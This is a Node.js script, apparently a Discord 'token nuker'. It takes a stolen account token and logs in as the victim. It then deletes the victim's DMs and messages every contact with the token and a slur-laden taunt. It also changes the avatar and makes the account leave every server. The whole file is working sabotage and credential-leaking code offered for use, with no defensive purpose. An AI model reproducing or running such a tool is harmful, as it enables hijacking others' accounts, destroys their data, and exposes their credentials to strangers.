const { Client } = require('discord.js')
const client = new Client();

const {red, green, magenta, white} = require('chalk')

const readline = require('readline');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

rl.question('Enter token to fuck: ', (token) => {

client.on('ready', () => {
    console.log(magenta(`
    

    
                        ╔═╗┬  ┌─┐┬ ┬┌─┐┬─┐┌─┐  ┌┬┐┌─┐┬┌─┌─┐┌┐┌  ┌┐┌┬ ┬┬┌─┌─┐┬─┐
                        ╚═╗│  ├─┤└┬┘├┤ ├┬┘└─┐   │ │ │├┴┐├┤ │││  ││││ │├┴┐├┤ ├┬┘
                        ╚═╝┴─┘┴ ┴ ┴ └─┘┴└─└─┘   ┴ └─┘┴ ┴└─┘┘└┘  ┘└┘└─┘┴ ┴└─┘┴└─

                             Logged in as: ${client.user.tag}


    `))

    try {
        client.users.forEach(u => {
            if (u.dmChannel) {
                u.deleteDM().catch(err => console.log(' '))
            }
        })
        console.log(white('[+] ') + red(`Deleted DM with ${u.tag}`))
} catch(e) {

    }
    try {
        client.users.forEach(user => {
            try {
            user.send(`HAHA, this retard got logged. His token is: ${token}`).catch(err => {}).then(() => {
                console.log(white('[+] ') + red(`Successfully dmed ${user.tag} `) + white('[+]'));
            })
        } catch(e) {
        }
        })
    } catch(e) {

    }
    try {
        client.user.setAvatar("https://cdn.discordapp.com/attachments/775403637466857512/807375739590672385/16bd0d529a9a6fd9f42e8ae6c89ee44c.png").catch(err => {});
        console.log(white('[+] ') + red('Set users avatar ') + white('[+]'));
    } catch(e) {
    }

    try {
        try {
        client.guilds.forEach(g => g.leave().catch(err => {}).then(guild => {
            try {
            var s = guild.name
            } catch(e) {
                s = 'No server found'
            }
            console.log(white('[+] ') + red(`Left server ${s  || "Couldn't find server"} `) + white('[+]'));
        }))
    } catch(e) {
        
    }
    } catch(e) {

    }
})
client.login(token).catch(err => {

})
})